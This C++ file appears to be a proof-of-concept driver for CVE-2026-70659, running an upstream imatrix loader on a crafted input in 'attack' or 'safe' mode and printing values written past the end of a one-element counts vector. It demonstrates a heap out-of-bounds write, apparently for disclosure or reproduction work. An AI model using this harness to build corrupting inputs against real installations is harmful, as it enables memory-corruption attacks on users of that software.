// sdimatrix2shell — in-process driver for CVE-2026-70659.
//
// run-all.sh extracts the verbatim `IMatrixCollector::load_imatrix` body from
// a pinned upstream tarball into load_imatrix.inc (with a #line directive so
// sanitizer traces name the real upstream source line). No branch, index,
// allocation or loop in that function is reimplemented here.
//
// #define private public is harness-only: it lets the driver read the named
// adjacent IMatrixStats::counts field after the call. It changes no code.
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <fstream>
#include <mutex>
#include <string>
#include <unordered_map>
#include <vector>

#define LOG_ERROR(...) std::fprintf(stderr, __VA_ARGS__)

#define private public
#include "runtime/imatrix.h"
#undef private

#include "load_imatrix.inc"

static uint32_t fbits(float f) {
    uint32_t u = 0;
    std::memcpy(&u, &f, sizeof(u));
    return u;
}

int main(int argc, char** argv) {
    if (argc != 3) {
        std::fputs("usage: poc INPUT attack|safe\n", stderr);
        return 2;
    }
    IMatrixCollector collector;
    const bool ok = collector.load_imatrix(argv[1]);
    const IMatrixStats& stats = collector.stats_["blk.0"];
    const uint32_t v0 = stats.values.empty() ? 0 : fbits(stats.values[0]);
    const uint32_t c0 = stats.counts.empty() ? 0 : (uint32_t)stats.counts[0];
    // Harness-only readback of the two ints written past the 1-element counts
    // vector. libstdc++ container annotations poison those slots under ASan,
    // so this observation is made in plain builds only.
#ifndef __has_feature
#define __has_feature(x) 0
#endif
#if defined(__SANITIZE_ADDRESS__) || __has_feature(address_sanitizer)
    const uint32_t o1 = 0;
    const uint32_t o2 = 0;
#else
    const uint32_t o1 = stats.counts.empty() ? 0 : (uint32_t)stats.counts.data()[1];
    const uint32_t o2 = stats.counts.empty() ? 0 : (uint32_t)stats.counts.data()[2];
#endif
    std::printf("RESULT mode=%s ok=%d values=%zu counts=%zu values0=0x%08x counts0=0x%08x counts_oob1=0x%08x counts_oob2=0x%08x\n",
                argv[2], ok ? 1 : 0, stats.values.size(), stats.counts.size(), v0, c0, o1, o2);
    return 0;
}
